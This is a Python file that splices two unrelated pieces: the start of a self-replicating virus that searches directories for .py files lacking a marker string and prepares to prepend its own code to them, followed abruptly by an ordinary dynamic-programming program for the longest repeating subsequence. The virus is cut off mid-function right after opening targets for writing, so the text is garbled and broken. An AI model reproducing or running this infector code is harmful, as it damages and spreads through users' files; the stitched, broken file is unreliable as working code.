#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python 3 program to find the longest repeating
# subsequence


# This function mainly returns LCS(str, str)
# with a condition that same characters at
# same index are not considered.
def findLongestRepeatingSubSeq(str):
    n = len(str)

    # Create and initialize DP table
    dp = [0 for i in range(n + 1)]

    # Fill dp table (similar to LCS loops)
    for i in range(1, n + 1):
        new_a = [0]
        for j in range(1, n + 1):
            # If characters match and indexes are
            # not same
            if str[i - 1] == str[j - 1] and i != j:
                new_a.append(1 + dp[j - 1])

                # If characters do not match
            else:
                new_a.append(max(dp[j], new_a[-1]))
        dp = new_a[:]
    return dp[-1]


# Driver Program
if __name__ == '__main__':
    str = "aabb"
    print("The length of the largest subsequence that repeats itself is : ",
          findLongestRepeatingSubSeq(str))

# this code is contributed by ash264
# Time Complexity: O(n^2)
# Space Complexity: O(n^2)
